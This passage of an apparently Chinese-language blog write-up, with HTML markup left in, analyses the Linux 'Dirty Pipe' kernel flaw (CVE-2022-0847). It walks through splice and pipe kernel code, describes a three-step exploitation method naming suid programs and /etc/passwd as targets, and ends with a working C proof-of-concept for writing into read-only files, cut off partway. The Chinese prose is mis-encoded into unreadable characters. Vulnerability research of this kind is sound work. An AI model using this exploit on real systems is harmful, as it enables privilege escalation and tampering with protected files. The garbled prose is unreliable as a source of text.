å°„çš„é¡µé¢é›†çš„å¯¹åº”é¡µæ¡†</strong>ï¼Œå°†é¡µæ¡†å¼•ç”¨è®¡æ•° + 1ï¼ˆ<code>get_page()</code>ï¼‰ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ª<strong>ä»æ–‡ä»¶è¯»å–æ•°æ®åˆ°ç®¡é“çš„è¿‡ç¨‹</strong>ï¼Œå› ä¸ºæ˜¯ç›´æ¥å»ºç«‹é¡µé¢çš„æ˜ å°„ï¼Œæ‰€ä»¥æ¯æ¬¡æ“ä½œåéƒ½ä¼šå°† head +1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°â€”â€”è¯¥æ“ä½œ<strong>ç¼ºå¤±äº†å¯¹ pipe_buffer-&gt;flags çš„é‡æ–°èµ‹å€¼æ“ä½œ</strong></p><h3 id="ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶"><a href="#ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶" class="headerlink" title="ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶"></a>ä»ç®¡é“è¯»å–åˆ°æ–‡ä»¶</h3><p><code>do_splice_from</code> æœ€ç»ˆä¼šè°ƒç”¨å¯¹åº”å†…æ ¸æ–‡ä»¶ç»“æ„çš„å‡½æ•°è¡¨ä¸­çš„ <code>splice_write()</code> æŒ‡é’ˆï¼Œå°† pipe_buffer æ•°ç»„å¯¹åº”é¡µé¢ä¸Šå†…å®¹è¯»å‡ºï¼Œå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¯¹äºä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿè€Œè¨€è¯¥å‡½æ•°æŒ‡é’ˆä¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to initiate a splice from pipe to file.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_splice_from</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">   <span class="type">loff_t</span> *ppos, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!out-&gt;f_op-&gt;splice_write))</span><br><span class="line"><span class="keyword">return</span> warn_unsupported(out, <span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ ext4 æ–‡ä»¶ç³»ç»Ÿä¸ºä¾‹ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>iter_file_splice_write</code> å‡½æ•°ï¼Œä¹‹åå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iter_file_splice_write(ï¼‰</span><br><span class="line">splice_from_pipe_next()// æ£€æŸ¥ç®¡é“å¯ç”¨æ€§</span><br><span class="line">vfs_iter_write()// è¯»å‡ºç®¡é“æ•°æ®å†™å…¥æ–‡ä»¶</span><br><span class="line">do_iter_write()</span><br><span class="line">do_iter_readv_writev()</span><br><span class="line">call_write_iter // ä¸Šå±‚ä¼ å…¥typeä¸º WRITEï¼Œèµ°å…¥è¯¥åˆ†æ”¯</span><br></pre></td></tr></table></figure><p><code>call_write_iter</code> æ˜¯æ–‡ä»¶å‡½æ•°è¡¨ä¸­ <code>write_iter()</code> çš„ wrapperï¼Œå¯¹ ext4 è€Œè¨€å¯¹åº”è°ƒç”¨ <code>ext4_file_write_iter</code>ï¼Œè¿™é‡Œæœ€ç»ˆåªæ˜¯å¸¸è§„çš„å°† buf ä¸Šæ•°æ®æ‹·è´åˆ°æ–‡ä»¶ä¸Šçš„æ“ä½œï¼Œä¹Ÿå¹¶éæœ¬ç¯‡çš„é‡ç‚¹ï¼Œå°±ä¸å±•å¼€åˆ†æäº†</p><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>æˆ‘ä»¬å’‹ä¸€çœ‹å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†è®©æˆ‘ä»¬æ€è€ƒè¿™æ ·ä¸€ä¸ªæƒ…æ™¯ï¼š</p><ul><li>æˆ‘ä»¬å°†ç®¡é“æ•´ä¸ªè¯»å†™äº†ä¸€è½®ï¼Œæ­¤æ—¶æ‰€æœ‰çš„ pipe_buffer éƒ½ä¿ç•™äº† <code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½</li><li>æˆ‘ä»¬åˆ©ç”¨ splice å°†æ•°æ®ä»æ–‡ä»¶è¯»å–ä¸€ä¸ªå­—èŠ‚åˆ°ç®¡é“ä¸Šï¼Œæ­¤æ—¶ pipe_buffer å¯¹åº”çš„ page æˆå‘˜<strong>æŒ‡å‘æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œä½†åœ¨ splice ä¸­<strong>å¹¶æœªæ¸…ç©º pipe_buffer çš„æ ‡å¿—ä½ï¼Œä»è€Œè®©å†…æ ¸è¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong></li><li>åœ¨ splice ä¸­å»ºç«‹å®Œé¡µé¢æ˜ å°„åï¼Œæ­¤æ—¶ head ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œæ­¤æ—¶æˆ‘ä»¬å†å‘ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼Œç®¡é“è®¡æ•°å™¨ä¼šå‘ç°ä¸Šä¸€ä¸ª pipe_buffer æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œ<strong>å°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª pipe_buffer å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œç”±äº <code>PIPE_BUF_FLAG_CAN_MERGE</code> ä»ä¿ç•™ç€ï¼Œå› æ­¤<strong>å†…æ ¸ä¼šè¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong>ï¼Œä»è€Œå®Œæˆäº†è¶Šæƒå†™å…¥æ–‡ä»¶çš„æ“ä½œ</li></ul><p>æ¼æ´ç‚¹ä¾¿æ˜¯åœ¨äº splice ç³»ç»Ÿè°ƒç”¨ä¸­<strong>æœªæ¸…ç©º</strong> <code>pipe_buffer</code> <strong>çš„æ ‡å¿—ä½ï¼Œä»è€Œå°†ç®¡é“é¡µé¢å¯å†™å…¥çš„çŠ¶æ€ä¿ç•™äº†ä¸‹æ¥</strong>ï¼Œè¿™ç»™äº†æˆ‘ä»¬è¶Šæƒå†™å…¥åªè¯»æ–‡ä»¶çš„æ“ä½œ</p><p>æˆ‘ä»¬ä¸éš¾å‘ç°è¿™ä¸ªæ¼æ´ä¸è„ç‰›ååˆ†ç±»ä¼¼ï¼Œéƒ½æ˜¯èƒ½è¶Šæƒå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œä¸åŒçš„æ˜¯è„ç‰›éœ€è¦å»æ’æ¡ä»¶ç«äº‰çš„æ¦‚ç‡ï¼Œè€Œè¯¥æ¼æ´<strong>å¯ä»¥ç¨³å®šè§¦å‘</strong>ï¼Œä½†æ˜¯è„ç‰›å¯ä»¥ç›´æ¥å†™æ•´ä¸ªæ–‡ä»¶ï¼Œè€Œ<strong>è¯¥æ¼æ´ä¸èƒ½åœ¨ç®¡é“è¾¹ç•Œä¸Šå†™å…¥</strong></p><blockquote><p>å½“ç„¶ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ç”šè‡³éƒ½æ˜¯ä¸å¯è¯»çš„ï¼Œé‚£è‡ªç„¶æ˜¯æ²¡æ³•åˆ©ç”¨çš„ï¼ˆç¬‘ï¼‰ï¼Œä½†åœ¨ä¸»æµ Linux å‘è¡Œç‰ˆä¸­æœ‰ç€å¤§é‡çš„å¯ä½œä¸ºæˆ‘ä»¬æ”»å‡»ç›®æ ‡çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ suid ç¨‹åºæˆ– <code>/etc/passwd</code> ç­‰</p></blockquote><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´åˆ©ç”¨çš„æ­¥éª¤å…¶å®æˆ‘ä»¬åœ¨å‰é¢éƒ½å·²ç»å™è¿°å¾—å·®ä¸å¤šäº†ï¼Œä¸»è¦å°±æ˜¯åˆ†ä¸‰æ­¥èµ°ï¼š</p><h2 id="Step-I-å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½®-PIPE-BUF-FLAG-CAN-MERGE-flag"><a href="#Step-I-å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½®-PIPE-BUF-FLAG-CAN-MERGE-flag" class="headerlink" title="Step.I å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½® PIPE_BUF_FLAG_CAN_MERGE flag"></a>Step.I å†™ã€è¯»ç®¡é“ï¼Œè®¾ç½® PIPE_BUF_FLAG_CAN_MERGE flag</h2><p>ä¸ºäº†ä¿è¯åˆ©ç”¨èƒ½å¤Ÿç¨³å®šæˆåŠŸï¼Œæˆ‘ä»¬é¦–å…ˆæ–°å»ºä¸€ä¸ªç®¡é“ï¼Œ<strong>å°†ç®¡é“å†™æ»¡åå†å°†æ‰€æœ‰æ•°æ®è¯»å‡º</strong>ï¼Œè¿™æ ·ç®¡é“çš„æ¯ä¸€ä¸ª <code>pipe_buffer</code> éƒ½ä¼šè¢«è®¾ç½®ä¸Š  <code>PIPE_BUF_FLAG_CAN_MERGE</code> æ ‡å¿—ä½</p><h2 id="Step-II-splice-å»ºç«‹-pipe-buffer-ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰"><a href="#Step-II-splice-å»ºç«‹-pipe-buffer-ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰" class="headerlink" title="Step.II splice å»ºç«‹ pipe_buffer ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰"></a>Step.II splice å»ºç«‹ pipe_buffer ä¸æ–‡ä»¶çš„å…³è”ï¼ˆæ¼æ´äº§ç”Ÿç‚¹ï¼‰</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ splice ç³»ç»Ÿè°ƒç”¨å°†æ•°æ®ä»ç›®æ ‡æ–‡ä»¶ä¸­è¯»å…¥åˆ°ç®¡é“ï¼Œä»è€Œè®© <code>pipe_buffer-&gt;page</code> å˜ä¸ºæ–‡ä»¶åœ¨å†…å­˜ä¸­æ˜ å°„çš„é¡µé¢ï¼Œä¸ºäº†è®©ä¸‹ä¸€æ¬¡å†™å…¥æ•°æ®æ—¶å†™å›æ–‡ä»¶æ˜ å°„çš„é¡µé¢ï¼Œæˆ‘ä»¬åº”å½“<strong>è¯»å…¥ä¸å¤šäºä¸€ä¸ªæ•°æ®çš„é¡µé¢</strong>ï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¯»å…¥ 1 ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æˆ‘ä»¬ä»èƒ½å‘æ–‡ä»¶ä¸Šå†™å…¥å°†è¿‘ä¸€å¼ é¡µé¢çš„æ•°æ®</p><p>å½“æˆ‘ä»¬å®Œæˆè¯»å…¥ä¹‹åï¼Œç®¡é“çš„ head æŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œå› æ­¤æˆ‘ä»¬è‹¥è¦å†™å…¥æ–‡ä»¶åˆ™åº”å½“èµ°å…¥åˆ° pipe_write å¼€å¤´å†™å…¥ä¸Šä¸€ä¸ª pipe_buffer çš„åˆ†æ”¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œåªè¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„ç¼˜æ•…</p><h2 id="Step-III-å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶"><a href="#Step-III-å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶" class="headerlink" title="Step.III å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶"></a>Step.III å‘ç®¡é“ä¸­å†™å…¥æ¶æ„æ•°æ®ï¼Œå®Œæˆè¶Šæƒå†™å…¥æ–‡ä»¶</h2><p>æ¥ä¸‹æ¥<strong>æˆ‘ä»¬ç›´æ¥å‘ç®¡é“ä¸­å†™å…¥æ•°æ®å°±èƒ½å®Œæˆå¯¹åªè¯»æ–‡ä»¶çš„è¶Šæƒå†™å…¥</strong>ã€‚åœ¨ splice ä¸­å»ºç«‹å®Œé¡µé¢æ˜ å°„åï¼Œæ­¤æ—¶ head ä¼šæŒ‡å‘ä¸‹ä¸€ä¸ª pipe_bufferï¼Œæ­¤æ—¶æˆ‘ä»¬å†å‘ç®¡é“ä¸­å†™å…¥æ•°æ®ï¼Œç®¡é“è®¡æ•°å™¨ä¼šå‘ç°ä¸Šä¸€ä¸ª pipe_buffer æ²¡æœ‰å†™æ»¡ï¼Œä»è€Œ<strong>å°†æ•°æ®æ‹·è´åˆ°ä¸Šä¸€ä¸ª pipe_buffer å¯¹åº”çš„é¡µé¢â€”â€”å³æ–‡ä»¶æ˜ å°„çš„é¡µé¢</strong>ï¼Œç”±äº <code>PIPE_BUF_FLAG_CAN_MERGE</code> ä»ä¿ç•™ç€ï¼Œå› æ­¤<strong>å†…æ ¸ä¼šè¯¯ä»¥ä¸ºè¯¥é¡µé¢å¯ä»¥è¢«å†™å…¥</strong>ï¼Œä»è€Œå®Œæˆäº†è¶Šæƒå†™å…¥æ–‡ä»¶çš„æ“ä½œ</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>æˆ‘ä»¬ä½¿ç”¨ qemu èµ·ä¸€ä¸ªæµ‹è¯•ç¯å¢ƒï¼Œçœ‹çœ‹æ˜¯å¦èƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´å¯¹åªè¯»æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œæœ€ç»ˆçš„ poc å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * POC of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">target_file_stat</span>;</span></span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file offset_in_file data&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (offset_in_file % page_size == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write on the boundary of a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fstat(target_file_fd, &amp;target_file_stat))</span><br><span class="line">errExit(<span class="string">&quot;Failed to get the info of the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset_in_file &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Offset is not in the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line">data_size = <span class="built_in">strlen</span>(argv[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">if</span> ((offset_in_file + data_size) &gt; target_file_stat.st_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot enlarge the file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((offset_in_file % page_size) + data_size) &gt; page_size)</span><br><span class="line">errExit(<span class="string">&quot;Cannot write accross a page!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], argv[<span class="number">3</span>], data_size);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write 